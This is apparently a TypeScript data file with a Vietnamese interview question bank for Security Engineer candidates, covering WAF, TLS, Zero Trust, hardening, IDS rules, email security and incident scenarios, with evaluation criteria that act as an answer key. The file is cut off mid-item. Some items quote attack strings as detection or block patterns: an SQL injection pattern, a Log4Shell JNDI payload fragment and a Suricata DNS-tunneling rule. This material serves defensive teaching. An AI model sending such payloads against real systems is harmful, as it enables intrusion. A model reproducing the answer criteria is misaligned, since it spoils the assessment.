import { RoleQuestionBank } from './types';

// Danh mục câu hỏi chuyên môn cho nhóm nghề: An toàn thông tin (Cybersecurity) (5 vị trí - 150 câu hỏi)
export const cybersecurityQuestionBanks: RoleQuestionBank[] = [
  {
    "role": "Security Engineer",
    "group": "cybersecurity",
    "groupLabel": "An toàn thông tin (Cybersecurity)",
    "aliases": [
      "security engineer",
      "ky su an toan thong tin",
      "cybersecurity engineer",
      "infosec engineer",
      "an ninh mang",
      "sec engineer"
    ],
    "questions": [
      {
        "id": "SEC_ENG-FOUND-01",
        "role": "Security Engineer",
        "category": "foundation",
        "difficulty": "basic",
        "seniority": "fresher_intern",
        "question": "Trong Security Engineer, phân biệt Defense in Depth, Least Privilege, Network Segmentation, DMZ; mô tả khi nào em áp dụng chúng trong bài tập.",
        "evaluationCriteria": [
          "Giải thích đúng ý nghĩa cơ bản của Defense in Depth.",
          "Phân biệt được các khái niệm liên quan Least Privilege, Network Segmentation, DMZ ở mức nhập môn.",
          "Đưa ra được ví dụ học tập phù hợp với vị trí Security Engineer."
        ],
        "followUps": [
          "Nếu mới học Defense in Depth, em sẽ dùng ví dụ đơn giản nào để tự kiểm tra mình đã hiểu?"
        ],
        "tags": [
          "Defense in Depth",
          "Least Privilege",
          "Network Segmentation",
          "DMZ",
          "Lateral Movement"
        ],
        "sourceRefs": [
          "https://www.nist.gov/cyberframework",
          "Tình huống nghiệp vụ và phỏng vấn thực tế - JobReady AI"
        ],
        "redFlags": [
          "Nhầm lẫn khái niệm nền tảng hoặc không thể đưa ra ví dụ cơ bản."
        ]
      },
      {
        "id": "SEC_ENG-FOUND-02",
        "role": "Security Engineer",
        "category": "foundation",
        "difficulty": "intermediate",
        "seniority": "junior",
        "question": "Nguyên lý vận hành của Tường lửa ứng dụng web (WAF) và Tường lửa thế hệ mới (NGFW): Phân biệt tầng hoạt động (Layer 7 vs Layer 3/4), cơ chế phát hiện dựa trên chữ ký (Signature-based) và dựa trên hành vi bất thường (Anomaly-based). Cách WAF ngăn chặn các cuộc tấn công SQL Injection và Cross-Site Scripting (XSS)?",
        "evaluationCriteria": [
          "NGFW hoạt động ở tầng 3/4/7 nhưng tập trung vào kiểm soát luồng mạng IP/Port/App-ID; WAF chuyên sâu ở tầng 7 phân tích sâu payload HTTP/HTTPS",
          "WAF giải mã SSL/TLS, phân tích cú pháp request URL, headers, body và đối chiếu với bộ luật (như OWASP Core Rule Set - CRS)",
          "Phát hiện SQLi qua các mẫu ký tự đặc biệt (' OR 1=1) và XSS qua các thẻ script độc hại"
        ],
        "followUps": [
          "Làm thế nào để giảm thiểu tỷ lệ báo động giả (False Positive) của WAF mà không làm suy yếu khả năng chặn đứng tấn công?",
          "WAF xử lý thế nào trước các cuộc tấn công từ chối dịch vụ HTTP Flood tầng 7 (Layer 7 DDoS)?"
        ],
        "tags": [
          "WAF",
          "NGFW",
          "Layer 7 Security",
          "OWASP CRS",
          "SQLi Prevention"
        ],
        "sourceRefs": [
          "https://owasp.org/www-project-top-ten/",
          "https://www.cloudflare.com/learning/ddos/glossary/web-application-firewall-waf/"
        ],
        "redFlags": [
          "Nhầm lẫn WAF với Tường lửa mạng thông thường và nghĩ rằng bật WAF là không cần vá lỗ hổng trong code"
        ]
      },
      {
        "id": "SEC_ENG-FOUND-03",
        "role": "Security Engineer",
        "category": "foundation",
        "difficulty": "advanced",
        "seniority": "middle",
        "question": "Cơ chế Quản lý khóa mật mã và Hạ tầng khóa công khai (PKI & TLS 1.3): Quá trình bắt tay (TLS Handshake) diễn ra như thế nào? Sự khác biệt giữa Mã hóa đối xứng (AES-GCM) và Bất đối xứng (RSA/ECC)? Tại sao thuộc tính Bí mật chuyển tiếp hoàn hảo (Perfect Forward Secrecy - PFS) lại quan trọng?",
        "evaluationCriteria": [
          "Nắm chắc luồng bắt tay TLS 1.3 tinh gọn (1-RTT hoặc 0-RTT); dùng mã hóa bất đối xứng để xác thực danh tính chứng chỉ và trao đổi khóa",
          "Dùng mã hóa đối xứng (AES-GCM / ChaCha20) để mã hóa luồng dữ liệu thực tế vì tốc độ xử lý nhanh",
          "PFS đảm bảo rằng nếu Private Key của server bị lộ trong tương lai thì các phiên trao đổi dữ liệu đã ghi lại trong quá khứ vẫn không thể bị giải mã"
        ],
        "followUps": [
          "Khi nào nên sử dụng xác thực hai chiều mTLS (Mutual TLS) thay vì TLS một chiều truyền thống?",
          "Quy trình kiểm tra tính hợp lệ của chứng chỉ số qua CRL và OCSP Stapling?"
        ],
        "tags": [
          "TLS 1.3",
          "PKI",
          "Perfect Forward Secrecy",
          "mTLS",
          "Cryptography"
        ],
        "sourceRefs": [
          "https://www.rfc-editor.org/rfc/rfc8446",
          "Tình huống nghiệp vụ và phỏng vấn thực tế - JobReady AI"
        ],
        "redFlags": [
          "Nghĩ rằng mã hóa bất đối xứng được dùng để mã hóa toàn bộ dữ liệu truyền tải trên đường truyền"
        ]
      },
      {
        "id": "SEC_ENG-FOUND-04",
        "role": "Security Engineer",
        "category": "foundation",
        "difficulty": "intermediate",
        "seniority": "middle",
        "question": "Quản lý vòng đời lỗ hổng bảo mật (Vulnerability Management Lifecycle): Các bước từ Khám phá tài sản (Asset Discovery), Quét lỗ hổng (Vulnerability Scanning), Đánh giá mức độ nghiêm trọng (CVSS v3.1 Scoring: Base, Temporal, Environmental), đến Khắc phục (Remediation) và Xác minh lại?",
        "evaluationCriteria": [
          "Asset Discovery: Không thể bảo vệ những gì mình không biết; kiểm kê đầy đủ IP, domain, máy chủ và dịch vụ đang mở",
          "Quét định kỳ bằng các công cụ chuyên nghiệp (Nessus, Qualys, OpenVAS)",
          "CVSS v3.1: Không chỉ nhìn vào Base Score (từ 0-10); phải xem xét Temporal (đã có mã khai thác công khai chưa) và Environmental (hệ thống có nằm trực diện Internet không) để ưu tiên vá lỗi"
        ],
        "followUps": [
          "Làm thế nào để thiết lập Thỏa thuận mức dịch vụ khắc phục lỗi (SLA Remediation: Critical trong 24h, High trong 7 ngày)?",
          "Sự khác biệt giữa Quét lỗ hổng tự động (Vulnerability Assessment) và Tấn công khai thác thực tế (Penetration Testing)?"
        ],
        "tags": [
          "Vulnerability Management",
          "CVSS v3.1",
          "Nessus",
          "Asset Discovery",
          "Remediation SLA"
        ],
        "sourceRefs": [
          "https://www.first.org/cvss/",
          "https://www.nist.gov/cyberframework"
        ],
        "redFlags": [
          "Chỉ biết bấm nút chạy máy quét và gửi file xuất PDF dày 200 trang cho dev mà không có phân loại ưu tiên"
        ]
      },
      {
        "id": "SEC_ENG-FOUND-05",
        "role": "Security Engineer",
        "category": "foundation",
        "difficulty": "advanced",
        "seniority": "senior_lead",
        "question": "Kiến trúc Không tin cậy (Zero Trust Architecture - ZTA theo NIST SP 800-207): Ba nguyên tắc cốt lõi: Xác thực liên tục (Verify explicitly), Sử dụng quyền hạn tối thiểu (Use least privileged access), và Luôn giả định có vi phạm (Assume breach). Thành phần Policy Engine (PE), Policy Administrator (PA) và Policy Enforcement Point (PEP) phối hợp ra sao?",
        "evaluationCriteria": [
          "Loại bỏ khái niệm mạng tin cậy: Mọi kết nối từ bên trong hay bên ngoài văn phòng đều bị đối xử bình đẳng như nhau và phải được xác thực danh tính",
          "PEP chặn luồng kết nối; PA/PE đánh giá ngữ cảnh động (Thiết bị có an toàn không, vị trí địa lý, hành vi bất thường) trước khi cấp phiên truy cập ngắn hạn",
          "Assume breach: Mã hóa toàn bộ dữ liệu lưu trữ và truyền tải, phân đoạn siêu nhỏ (Micro-segmentation) để cô lập thảm họa"
        ],
        "followUps": [
          "Làm thế nào để chuyển đổi từ mạng VPN truyền thống sang giải pháp ZTNA (Zero Trust Network Access)?",
          "Tại sao việc áp dụng Zero Trust bắt buộc phải lấy Định danh (Identity) làm chu vi bảo mật mới (New Perimeter)?"
        ],
        "tags": [
          "Zero Trust",
          "NIST SP 800-207",
          "ZTNA",
          "Micro-segmentation",
          "Assume Breach"
        ],
        "sourceRefs": [
          "https://csrc.nist.gov/pubs/sp/800/207/final",
          "Tình huống nghiệp vụ và phỏng vấn thực tế - JobReady AI"
        ],
        "redFlags": [
          "Nghĩ rằng mua một thiết bị dán nhãn 'Zero Trust' cắm vào mạng là xong mà không hiểu đây là một triết lý kiến trúc"
        ]
      },
      {
        "id": "SEC_ENG-FOUND-06",
        "role": "Security Engineer",
        "category": "foundation",
        "difficulty": "intermediate",
        "seniority": "junior",
        "question": "Bảo mật Hệ điều hành và Thiết lập cấu hình chuẩn (System Hardening & CIS Benchmarks): Những biện pháp tăng cường an ninh cơ bản cho máy chủ Linux (Ubuntu/RHEL) trong môi trường sản xuất (Tắt dịch vụ thừa, Cấu hình SSH an toàn, Quản lý Sudoers, Cấu hình UFW/iptables, SELinux/AppArmor)?",
        "evaluationCriteria": [
          "Tuân thủ chuẩn CIS Benchmarks: Tắt toàn bộ cổng mạng và dịch vụ không sử dụng (rsh, telnet, ftp)",
          "Bảo mật SSH: Đổi cổng mặc định, cấm đăng nhập bằng mật khẩu (chỉ dùng SSH Key), cấm root login trực tiếp (PermitRootLogin no), giới hạn dải IP truy cập",
          "Bật chế độ bắt buộc (Enforcing Mode) của SELinux hoặc AppArmor để giới hạn quyền hạn của các tiến trình dịch vụ dù bị chiếm quyền"
        ],
        "followUps": [
          "Làm thế nào để tự động hóa việc rà soát tuân thủ CIS Benchmarks trên hàng trăm máy chủ bằng Ansible hoặc Lynis?",
          "Cách cấu hình công cụ auditd để ghi vết các hành vi thay đổi file hệ thống quan trọng (/etc/passwd, /etc/shadow)?"
        ],
        "tags": [
          "System Hardening",
          "CIS Benchmarks",
          "Linux Security",
          "SELinux",
          "SSH Hardening"
        ],
        "sourceRefs": [
          "https://www.cisecurity.org/cis-benchmarks",
          "Tình huống nghiệp vụ và phỏng vấn thực tế - JobReady AI"
        ],
        "redFlags": [
          "Để máy chủ Linux chạy cấu hình mặc định, cho phép đăng nhập root qua mật khẩu đơn giản"
        ]
      },
      {
        "id": "SEC_ENG-SKILL-01",
        "role": "Security Engineer",
        "category": "practical_skills",
        "difficulty": "basic",
        "seniority": "fresher_intern",
        "question": "Mô phỏng AWS WAF (Cloudflare WAF, Rate Limiting, Brute-force Defense, Managed Challenge) cho Security Engineer: em chuẩn bị gì, thao tác nào và đo kết quả ra sao?",
        "evaluationCriteria": [
          "Nêu mục đích sử dụng AWS WAF trong một bài tập hoặc dự án nhỏ.",
          "Trình bày được các bước thực hiện theo thứ tự và phù hợp với Intern/Fresher.",
          "Đề xuất được cách kiểm tra kết quả và biết khi nào cần tra cứu hoặc hỏi người hướng dẫn."
        ],
        "followUps": [
          "Nếu kết quả chưa đúng, em sẽ kiểm tra bước nào đầu tiên và dựa vào dấu hiệu gì?"
        ],
        "tags": [
          "AWS WAF",
          "Cloudflare WAF",
          "Rate Limiting",
          "Brute-force Defense",
          "Managed Challenge"
        ],
        "sourceRefs": [
          "https://owasp.org/www-project-top-ten/",
          "https://docs.aws.amazon.com/security/"
        ],
        "redFlags": [
          "Không xác định được mục tiêu thực hành hoặc nêu cách kiểm tra kết quả không phù hợp."
        ]
      },
      {
        "id": "SEC_ENG-SKILL-02",
        "role": "Security Engineer",
        "category": "practical_skills",
        "difficulty": "intermediate",
        "seniority": "fresher_intern",
        "question": "Bài tập Security Engineer: dựa trên Micro-segmentation, phối hợp Palo Alto, Fortinet, DMZ Architecture, Bastion Host; đầu ra sẽ được kiểm tra bằng tiêu chí nào?",
        "evaluationCriteria": [
          "Nêu mục đích sử dụng Micro-segmentation trong một bài tập hoặc dự án nhỏ.",
          "Trình bày được các bước thực hiện theo thứ tự và phù hợp với Intern/Fresher.",
          "Đề xuất được cách kiểm tra kết quả và biết khi nào cần tra cứu hoặc hỏi người hướng dẫn."
        ],
        "followUps": [
          "Nếu kết quả chưa đúng, em sẽ kiểm tra bước nào đầu tiên và dựa vào dấu hiệu gì?"
        ],
        "tags": [
          "Micro-segmentation",
          "Palo Alto",
          "Fortinet",
          "DMZ Architecture",
          "Bastion Host"
        ],
        "sourceRefs": [
          "https://www.nist.gov/cyberframework",
          "Tình huống nghiệp vụ và phỏng vấn thực tế - JobReady AI"
        ],
        "redFlags": [
          "Không xác định được mục tiêu thực hành hoặc nêu cách kiểm tra kết quả không phù hợp."
        ]
      },
      {
        "id": "SEC_ENG-SKILL-03",
        "role": "Security Engineer",
        "category": "practical_skills",
        "difficulty": "intermediate",
        "seniority": "middle",
        "question": "Quy trình Quét lỗ hổng hạ tầng định kỳ bằng Nessus hoặc Qualys: Em cấu hình chính sách quét có xác thực (Credentialed / Authenticated Scan) và không xác thực (Non-credentialed Scan) ra sao? Cách tối ưu hóa băng thông để quá trình quét không làm nghẽn mạng hoặc sập dịch vụ đang chạy?",
        "evaluationCriteria": [
          "Quét Non-credentialed: Đóng vai trò kẻ tấn công bên ngoài, chỉ quét các cổng mở và banner dịch vụ",
          "Quét Credentialed: Cung cấp tài khoản SSH/Windows an toàn để máy quét kiểm tra sâu vào phiên bản phần mềm, bản vá OS và cấu hình registry bên trong",
          "Tối ưu hóa: Lên lịch quét vào ban đêm/cuối tuần, giới hạn số lượng hosts quét đồng thời (Max Concurrent Hosts = 10) và tắt các plugin kiểm tra từ chối dịch vụ nguy hiểm (DoNS plugins)"
        ],
        "followUps": [
          "Tại sao kết quả quét Authenticated lại phát hiện được nhiều lỗ hổng hơn gấp 5 lần so với Unauthenticated?",
          "Cách tự động xuất kết quả quét và đồng bộ hóa ticket xử lý lỗ hổng vào hệ thống Jira của team IT Ops?"
        ],
        "tags": [
          "Nessus Scan",
          "Qualys",
          "Credentialed Scanning",
          "Safe Scanning Policy",
          "Vulnerability Assessment"
        ],
        "sourceRefs": [
          "https://docs.tenable.com/nessus/",
          "Tình huống nghiệp vụ và phỏng vấn thực tế - JobReady AI"
        ],
        "redFlags": [
          "Chạy quét lỗ hổng với tốc độ tối đa vào giờ cao điểm làm sập toàn bộ dịch vụ web của công ty"
        ]
      },
      {
        "id": "SEC_ENG-SKILL-04",
        "role": "Security Engineer",
        "category": "practical_skills",
        "difficulty": "advanced",
        "seniority": "senior_lead",
        "question": "Thiết kế và Triển khai Hệ thống Xác thực Đa yếu tố (Multi-Factor Authentication - MFA) cấp doanh nghiệp: Em tích hợp Identity Provider (Okta, Microsoft Entra ID) với các giao thức SAML 2.0 / OIDC như thế nào? Tại sao việc chuyển dịch sang FIDO2 / WebAuthn (Passkeys / Khóa bảo mật phần cứng YubiKey) là giải pháp duy nhất chống được tấn công Phishing-resistant?",
        "evaluationCriteria": [
          "MFA qua SMS OTP hoặc email dễ bị vượt qua bằng kỹ thuật SIM Swap hoặc các trang web lừa đảo trung gian (Adversary-in-the-Middle - AitM Phishing)",
          "FIDO2 / WebAuthn gắn liền việc xác thực với tên miền gốc của trang web thông qua mật mã khóa công khai; hacker dù dựng trang lừa đảo y hệt cũng không thể lấy được chữ ký hợp lệ",
          "Cấu hình chính sách truy cập có điều kiện (Conditional Access Policies): bắt buộc dùng FIDO2 đối với các tài khoản quản trị hệ thống quan trọng"
        ],
        "followUps": [
          "Quá trình trao đổi assertion trong SAML 2.0 diễn ra như thế nào giữa Service Provider (SP) và Identity Provider (IdP)?",
          "Làm thế nào để thiết lập quy trình cấp lại khóa bảo mật khẩn cấp khi nhân viên làm mất YubiKey?"
        ],
        "tags": [
          "MFA",
          "FIDO2",
          "WebAuthn",
          "Phishing-resistant",
          "YubiKey",
          "Okta / Entra ID"
        ],
        "sourceRefs": [
          "https://fidoalliance.org/fido2/",
          "https://www.okta.com/products/single-sign-on/"
        ],
        "redFlags": [
          "Chỉ dùng SMS OTP làm lớp xác thực thứ hai cho các tài khoản quản trị nhạy cảm"
        ]
      },
      {
        "id": "SEC_ENG-SKILL-05",
        "role": "Security Engineer",
        "category": "practical_skills",
        "difficulty": "intermediate",
        "seniority": "middle",
        "question": "Cấu hình Hệ thống Phát hiện và Ngăn chặn Xâm nhập (IDS/IPS với Snort / Suricata / Zeek): Em viết các bộ luật (Rules syntax) để phát hiện hành vi quét cổng (Port Scan) hoặc phát hiện mã độc liên lạc với máy chủ điều khiển (C2 Beaconing) qua DNS Tunneling như thế nào?",
        "evaluationCriteria": [
          "Viết rule Suricata/Snort chuẩn xác: alert dns $HOME_NET any -> any 53 (msg:'DNS Tunneling Query Detected'; content:'|00 01|'; pcre:'/.../'; threshold:...)",
          "Phát hiện DNS Tunneling: giám sát độ dài bất thường của chuỗi truy vấn tên miền con (High Entropy Subdomain) và khối lượng truy vấn TXT record tăng đột biến",
          "Triển khai ở chế độ Inline (IPS) để tự động thả gói tin (Drop packet) hoặc chế độ SPAN/TAP (IDS) để cảnh báo mà không làm gián đoạn đường truyền"
        ],
        "followUps": [
          "Sự khác biệt giữa Zeek (phân tích giao thức mạng chuyên sâu) và Suricata (đối chiếu chữ ký gói tin)?",
          "Làm thế nào để điều chỉnh ngưỡng threshold nhằm loại bỏ cảnh báo giả khi có công cụ nội bộ quét mạng định kỳ?"
        ],
        "tags": [
          "Suricata",
          "Snort",
          "IDS/IPS",
          "DNS Tunneling",
          "Network Signatures"
        ],
        "sourceRefs": [
          "https://suricata.io/",
          "Tình huống nghiệp vụ và phỏng vấn thực tế - JobReady AI"
        ],
        "redFlags": [
          "Bật toàn bộ 50,000 rules có sẵn trong IDS mà không tinh chỉnh khiến máy chủ quá tải CPU và tràn ngập cảnh báo giả"
        ]
      },
      {
        "id": "SEC_ENG-SKILL-06",
        "role": "Security Engineer",
        "category": "practical_skills",
        "difficulty": "advanced",
        "seniority": "middle",
        "question": "Quản lý Khóa mã hóa và Bí mật doanh nghiệp (Enterprise Secrets Management): Em triển khai HashiCorp Vault hoặc AWS KMS như thế nào để loại bỏ hoàn toàn mật khẩu và API Keys viết cứng trong mã nguồn? Cơ chế tạo Secret động (Dynamic Secrets) và tự động xoay vòng khóa (Key Rotation) hoạt động ra sao?",
        "evaluationCriteria": [
          "Tích hợp HashiCorp Vault với Kubernetes qua Vault Agent Sidecar để tự động tiêm secrets vào biến môi trường của container",
          "Dynamic Secrets: Vault tự động tạo tài khoản cơ sở dữ liệu tạm thời có thời hạn sống (TTL) 1 giờ cho ứng dụng; hết giờ tự động thu hồi",
          "Cấu hình tự động xoay vòng khóa mã hóa (Key Rotation 90 ngày) trong AWS KMS mà không làm gián đoạn khả năng giải mã dữ liệu cũ"
        ],
        "followUps": [
          "Thuật toán Shamir's Secret Sharing được sử dụng như thế nào trong cơ chế Unseal của Vault?",
          "Làm thế nào để thiết lập quy trình kiểm toán (Audit Log) theo dõi xem ai đã đọc secret nào trong Vault?"
        ],
        "tags": [
          "HashiCorp Vault",
          "AWS KMS",
          "Dynamic Secrets",
          "Secrets Management",
          "Key Rotation"
        ],
        "sourceRefs": [
          "https://developer.hashicorp.com/vault/docs",
          "https://docs.aws.amazon.com/security/"
        ],
        "redFlags": [
          "Lưu trữ mật khẩu cơ sở dữ liệu trong file cấu hình .env đưa lên GitHub công khai"
        ]
      },
      {
        "id": "SEC_ENG-SKILL-07",
        "role": "Security Engineer",
        "category": "practical_skills",
        "difficulty": "intermediate",
        "seniority": "junior",
        "question": "Bảo mật Hệ thống Thư điện tử doanh nghiệp (Email Security): Em cấu hình bộ ba bản ghi SPF (Sender Policy Framework), DKIM (DomainKeys Identified Mail) và DMARC (Domain-based Message Authentication, Reporting, and Conformance) trên DNS như thế nào để ngăn chặn kẻ xấu giả mạo tên miền công ty gửi email lừa đảo (Email Spoofing)?",
        "evaluationCriteria": [
          "SPF: Khai báo danh sách các địa chỉ IP máy chủ được phép gửi email thay mặt cho tên miền (v=spf1 ip4:... -all)",
          "DKIM: Ký số mã hóa vào header của email bằng Private Key; máy chủ nhận đối chiếu chữ ký bằng Public Key trên DNS record",
          "DMARC: Định nghĩa chính sách xử lý khi SPF/DKIM thất bại (p=none để theo dõi, p=quarantine đưa vào spam, p=reject từ chối thẳng) và nhận báo cáo định kỳ"
        ],
        "followUps": [
          "Tại sao việc đặt chính sách DMARC là p=none trong nhiều năm không có tác dụng bảo vệ tên miền?",
          "Cách xử lý xung đột SPF khi công ty sử dụng nhiều dịch vụ gửi mail bên thứ ba (SendGrid, Mailchimp, Google Workspace)?"
        ],
        "tags": [
          "Email Security",
          "DMARC",
          "SPF",
          "DKIM",
          "Anti-spoofing"
        ],
        "sourceRefs": [
          "https://dmarc.org/",
          "Tình huống nghiệp vụ và phỏng vấn thực tế - JobReady AI"
        ],
        "redFlags": [
          "Cấu hình SPF dạng `+all` cho phép bất kỳ ai trên thế giới cũng có thể mạo danh tên miền của công ty gửi email"
        ]
      },
      {
        "id": "SEC_ENG-SKILL-08",
        "role": "Security Engineer",
        "category": "practical_skills",
        "difficulty": "advanced",
        "seniority": "senior_lead",
        "question": "Thiết kế Giải pháp Bảo mật Truy cập Từ xa an toàn (Secure Remote Access): So sánh giữa mô hình VPN truyền thống (IPsec / OpenVPN) và Giải pháp Mạng riêng ảo Zero Trust (ZTNA / BeyondCorp). Em kiến trúc giải pháp ZTNA với Cloudflare Access hoặc Zscaler để bảo vệ ứng dụng nội bộ công ty như thế nào?",
        "evaluationCriteria": [
          "VPN truyền thống cấp quyền truy cập toàn bộ mạng LAN sau khi kết nối, tạo nguy cơ lây lan diện rộng nếu máy nhân viên nhiễm mã độc",
          "ZTNA cấp quyền truy cập theo từng ứng dụng cụ thể (Application-specific), không cấp quyền vào tầng mạng LAN; kết nối qua Reverse Proxy an toàn",
          "Kiểm tra tình trạng thiết bị (Device Posture Check: máy phải cài phần mềm EDR, bật mã hóa ổ đĩa BitLocker, cập nhật OS mới nhất) trước khi cho phép truy cập"
        ],
        "followUps": [
          "Làm thế nào để triển khai ZTNA cho các giao thức không phải nền web (SSH, RDP, Database) một cách mượt mà?",
          "Cách xử lý khi nhân viên làm việc tại các quốc gia có kiểm duyệt mạng internet gắt gao?"
        ],
        "tags": [
          "ZTNA",
          "Cloudflare Access",
          "Zscaler",
          "BeyondCorp",
          "Secure Remote Access"
        ],
        "sourceRefs": [
          "https://csrc.nist.gov/pubs/sp/800/207/final",
          "https://www.cloudflare.com/learning/access-management/what-is-ztna/"
        ],
        "redFlags": [
          "Cấp quyền VPN toàn mạng không kèm kiểm tra bảo mật máy trạm cho tất cả nhân viên làm việc từ xa"
        ]
      },
      {
        "id": "SEC_ENG-SCEN-01",
        "role": "Security Engineer",
        "category": "scenario",
        "difficulty": "intermediate",
        "seniority": "fresher_intern",
        "question": "Tại Security Engineer, khi Containment cùng DMZ Breach, Lateral Movement Blocking, Memory Forensics, Incident Isolation xuất hiện và em bắt gặp cảnh báo đáng ngờ trong môi trường thực hành được cấp phép, em kiểm tra log hay dữ liệu nào trước?",
        "evaluationCriteria": [
          "Làm rõ hiện tượng và thu thập thông tin trước khi kết luận.",
          "Đề xuất bước xử lý ban đầu an toàn, phù hợp với Intern/Fresher trong Security Engineer.",
          "Biết xác nhận kết quả và báo người hướng dẫn khi vấn đề vượt quá phạm vi hiểu biết."
        ],
        "followUps": [
          "Em sẽ tóm tắt phát hiện và phần chưa chắc chắn với người hướng dẫn như thế nào?"
        ],
        "tags": [
          "Containment",
          "DMZ Breach",
          "Lateral Movement Blocking",
          "Memory Forensics",
          "Incident Isolation"
        ],
        "sourceRefs": [
          "Tình huống nghiệp vụ và phỏng vấn thực tế - JobReady AI",
          "https://www.sans.org/white-papers/33342/"
        ],
        "redFlags": [
          "Đưa ra hành động rủi ro, vượt quyền hoặc bỏ qua bước xác minh và báo cáo."
        ]
      },
      {
        "id": "SEC_ENG-SCEN-02",
        "role": "Security Engineer",
        "category": "scenario",
        "difficulty": "advanced",
        "seniority": "senior_lead",
        "question": "Tình huống: Công ty chuẩn bị chuyển dịch toàn bộ hệ thống lõi từ On-Premises lên hạ tầng đám mây AWS. Ban giám đốc yêu cầu phải thiết kế kiến trúc bảo mật đạt chuẩn ngay từ đầu. Em thiết kế mô hình tài khoản AWS (AWS Multi-Account với AWS Organizations, Landing Zone), mạng kết nối an toàn (Transit Gateway, VPC Peering) và phân quyền IAM như thế nào?",
        "evaluationCriteria": [
          "Tách biệt môi trường thành nhiều tài khoản AWS độc lập (Security Account, Log Archive, Shared Services, Dev, Staging, Prod)",
          "Kết nối mạng tập trung bằng AWS Transit Gateway kết hợp Centralized Egress/Ingress VPC có cài đặt tường lửa kiểm soát lưu lượng",
          "Quản lý định danh tập trung qua AWS IAM Identity Center tích hợp IdP doanh nghiệp; cấm tuyệt đối việc tạo IAM User cố định có Access Key dài hạn trong các tài khoản môi trường"
        ],
        "followUps": [
          "Làm thế nào để kích hoạt AWS GuardDuty, Security Hub và AWS Config trên toàn bộ các tài khoản tự động?",
          "Cách bảo vệ tài khoản gốc Root Account (khóa trong két sắt, thiết lập MFA vật lý, cảnh báo khi có đăng nhập)?"
        ],
        "tags": [
          "AWS Landing Zone",
          "Multi-Account Security",
          "Transit Gateway",
          "IAM Identity Center",
          "Cloud Architecture"
        ],
        "sourceRefs": [
          "https://docs.aws.amazon.com/security/",
          "Tình huống nghiệp vụ và phỏng vấn thực tế - JobReady AI"
        ],
        "redFlags": [
          "Nhồi nhét toàn bộ môi trường Dev, Test, Prod vào một tài khoản AWS duy nhất và dùng chung một mạng VPC"
        ]
      },
      {
        "id": "SEC_ENG-SCEN-03",
        "role": "Security Engineer",
        "category": "scenario",
        "difficulty": "intermediate",
        "seniority": "middle",
        "question": "Tình huống: Một đợt quét lỗ hổng phát hiện ra lỗ hổng thực thi mã từ xa cực kỳ nghiêm trọng (Critical RCE - ví dụ Log4Shell) tồn tại trên một dịch vụ thanh toán quan trọng. Tuy nhiên, đội ngũ phát triển thông báo rằng họ cần ít nhất 3 ngày để kiểm thử bản vá code trước khi deploy. Em triển khai các biện pháp phòng vệ tạm thời (Virtual Patching) trên tầng mạng ra sao trong lúc chờ bản vá?",
        "evaluationCriteria": [
          "Triển khai Virtual Patching ngay lập tức trên WAF: tạo custom rule chặn tất cả các request chứa chuỗi payload khai thác đặc trưng (vd: `${jndi:ldap:...}`)",
          "Cấu hình hạn chế lưu lượng mạng ở tầng hệ điều hành/mạng: chặn kết nối Outbound từ máy chủ ứng dụng ra Internet (chặn cổng 389, 636, 1099, 1389) để kẻ tấn công không thể tải mã độc từ máy chủ C2 về",
          "Bật tính năng giám sát tăng cường (Enhanced Monitoring) và đặt cảnh báo khẩn cấp cho bất kỳ tiến trình con bất thường nào được sinh ra từ dịch vụ"
        ],
        "followUps": [
          "Tại sao Virtual Patching chỉ là giải pháp tình thế và không thể thay thế cho việc vá code gốc?",
          "Làm thế nào để kiểm chứng rule WAF mới tạo không gây lỗi chặn nhầm các giao dịch thanh toán hợp lệ?"
        ],
        "tags": [
          "Virtual Patching",
          "WAF Rule",
          "Log4Shell Mitigation",
          "Zero-day Defense",
          "Compensating Controls"
        ],
        "sourceRefs": [
          "https://owasp.org/www-project-top-ten/",
          "Tình huống nghiệp vụ và phỏng vấn thực tế - JobReady AI"
        ],
        "redFlags": [
          "Ngồi chờ đội ngũ dev làm xong bản vá trong 3 ngày mà không có bất kỳ biện pháp giảm thiểu rủi ro nào ở tầng mạng"
        ]
      },
      {
        "id": "SEC_ENG-SCEN-04",
        "role": "Security Engineer",
        "category": "scenario",
        "difficulty": "intermediate",
        "seniority": "middle",
        "question": "Tình huống: Nhân viên phòng Kế toán báo cáo rằng họ vừa nhận được một email từ Giám đốc điều hành yêu cầu chuyển tiền khẩn cấp 500 triệu đồng cho đối tác qua một số tài khoản lạ. Khi kiểm tra, em phát hiện email được gửi từ một tên miền gần giống (Typosquatting: thay chữ `o` bằng số `0`). Em tiến hành xử lý sự cố lừa đảo mạo danh (CEO Fraud / BEC) này như thế nào?",
        "evaluationCriteria": [
          "Can thiệp ngăn chặn chuyển tiền ngay lập tức: liên hệ trực tiếp với kế toán trưởng và ngân hàng để dừng lệnh chuyển tiền nếu giao dịch chưa hoàn tất",
          "Cập nhật khẩn cấp trên Email Gateway: chặn tên miền typosquatting đó trên toàn công ty và tìm kiếm xem có nhân viên nào khác nhận được email tương tự không",
          "Thực hiện mua lại hoặc gửi yêu cầu gỡ bỏ tên miền lừa đảo (Takedown request) tới nhà đăng ký tên miền (Registrar) và nâng cấp nhận thức an ninh cho khối tài chính"
        ],
        "followUps": [
          "Làm thế nào để cấu hình email gateway tự động gắn cờ cảnh báo [EXTERNAL EMAIL] cho các thư gửi từ bên ngoài công ty?",
          "Quy trình xác thực ngoại tuyến (Out-of-band verification) bằng cuộc gọi điện thoại đối với các lệnh chuyển tiền lớn?"
        ],
        "tags": [
          "Business Email Compromise (BEC)",
          "Typosquatting",
          "Email Takedown",
          "Security Awareness",
          "Fraud Prevention"
        ],
        "sourceRefs": [
          "Tình huống nghiệp vụ và phỏng vấn thực tế - JobReady AI"
        ],
        "redFlags": [
          "Chỉ xóa email đó mà không rà soát các nạn nhân khác và không chặn tên miền độc hại trên toàn hệ thống"
        ]
      },
      {
        "id": "SEC_ENG-SCEN-05",
        "role": "Security Engineer",
        "category": "scenario",
        "difficulty": "advanced",
        "seniority": "senior_lead",
        "question": "Tình huống: Doanh nghiệp bị tấn công từ chối dịch vụ phân tán (DDoS) kết hợp cả 3 tầng: Tấn công băng thông (NTP/DNS Amplification tầng 3/4 lên tới 100Gbps) và Tấn công cạn kiệt tài nguyên máy chủ (HTTPS Flood tầng 7 nhắm vào trang tìm kiếm). Toàn bộ website bị tê liệt. Em điều phối quy trình ứng phó và kích hoạt dịch vụ chống DDoS khẩn cấp ra sao?",
        "evaluationCriteria": [
          "Kích hoạt ngay dịch vụ làm sạch lưu lượng đám mây (Cloud Scrubbing Center như Cloudflare Magic Transit hoặc AWS Shield): chuyển hướng phân giải DNS sang hạ tầng Anycast để hấp thụ băng thông tấn công",
